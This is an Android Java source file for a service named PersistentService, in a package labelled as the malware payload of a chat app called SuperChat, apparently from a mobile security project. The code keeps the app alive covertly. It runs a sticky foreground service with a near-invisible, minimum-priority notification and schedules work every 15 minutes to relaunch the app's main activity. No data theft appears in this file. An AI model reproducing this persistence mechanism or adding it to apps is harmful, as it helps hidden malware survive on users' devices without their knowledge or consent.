package com.teamxdevelopers.SuperChat.malware.JavaPayload;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.core.app.NotificationCompat;
import androidx.work.Constraints;
import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;

import com.teamxdevelopers.SuperChat.R;

import java.util.concurrent.TimeUnit;

public class PersistentService extends Service {
    private static final String TAG = "PersistentService";
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Service onStartCommand called");
        schedulePeriodicWork();
        startForegroundService(); // Keep this if you want the service to stay in the foreground
        return START_STICKY;
    }

    private void schedulePeriodicWork() {

        PeriodicWorkRequest.Builder workBuilder =
                new PeriodicWorkRequest.Builder(StartMainActivityWorker.class, 15, TimeUnit.MINUTES);

        // Additional constraints can be added here
        Constraints constraints = new Constraints.Builder()
                .setRequiresBatteryNotLow(true)
                .build();

        workBuilder.setConstraints(constraints);

        PeriodicWorkRequest workRequest = workBuilder.build();
        WorkManager.getInstance(this).enqueueUniquePeriodicWork("StartMainActivityWork", ExistingPeriodicWorkPolicy.KEEP, workRequest);
        Log.d(TAG, "Periodic work scheduled");
    }


    private void startForegroundService() {
        String NOTIFICATION_CHANNEL_ID = "com.mobilesecurity.superchat";
        String channelName = "Background Service";
        NotificationChannel chan = null;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            chan = new NotificationChannel(NOTIFICATION_CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_NONE);
            NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (manager != null) {
                manager.createNotificationChannel(chan);
                Log.d(TAG, "Notification channel created");
            } else {
                Log.e(TAG, "NotificationManager is null");
            }
        }

        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID);
        Notification notification = notificationBuilder.setOngoing(true)
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setContentTitle("App is running in background")
                .setPriority(NotificationManager.IMPORTANCE_MIN)
                .setCategory(Notification.CATEGORY_SERVICE)
                .build();
        startForeground(2, notification);
        Log.d(TAG, "Foreground service started");
    }

    @Override
    public IBinder onBind(Intent intent) {
        // We don't provide binding, so return null
        return null;
    }

}
